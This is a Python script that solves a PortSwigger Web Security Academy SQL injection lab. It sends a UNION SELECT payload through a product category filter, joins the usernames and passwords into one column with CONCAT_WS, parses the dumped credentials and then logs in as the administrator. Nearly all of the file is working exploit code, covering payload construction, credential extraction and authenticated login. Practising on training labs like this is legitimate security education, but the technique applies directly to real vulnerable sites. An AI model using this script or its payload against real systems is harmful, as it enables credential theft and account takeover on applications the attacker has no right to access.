#!/usr/bin/env python

"""This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The database contains a different table called users, with columns called username and password.

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.

Lab link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
"""

# Vulnerable query = '+UNION+SELECT+username,password+FROM+users--

import requests
from bs4 import BeautifulSoup
import sys

s = requests.session()
lab_id = '0a2c00e00427a191c081872e00a200cd' #change based on generated lab page id


def getCreds(query: str) -> dict:
    entries = {}
    uri = f"https://{lab_id}.web-security-academy.net/filter?category={query}"
    r = requests.get(uri)
    parse = BeautifulSoup(r.text, 'lxml')
    for tr in parse.findAll('tr'):
        tr_entry = tr.text.strip().split(':') # split the table text into an array of user, pass values using the ":" as a separation mark
        key = tr_entry[0]
        value = tr_entry[1]
        entries[key] = value
    if not entries == {}:
        print(f"Found query results: {entries}")
        return entries
    else:
        print("Nothing found. Check query")
        sys.exit(-1)


def login(username: str, password: str) -> None:
    uri = f"https://{lab_id}.web-security-academy.net/login"
    r = s.get(uri) 
    parse = BeautifulSoup(r.text, 'lxml')
    token = parse.find('input', {'name': 'csrf'})['value'] #csrf token

    data = { 'username' : username,
        'password' : password,
        'csrf': token
    }

    print(f"Attempting to login with user: {username}")
    r2 = s.post(uri, data=data)
    if "Your username is: administrator" in r2.text:
        print("solved")
    else:
        print("nope")


def main() -> None:
    sqli_query = "'+UNION+SELECT+NULL,CONCAT_WS(':',username,password)+FROM+users--" #We can only write to one column, so the user/pass is joined with ":"
    results = getCreds(sqli_query)
    login('administrator',results['administrator'])


if __name__ == "__main__":
    main()



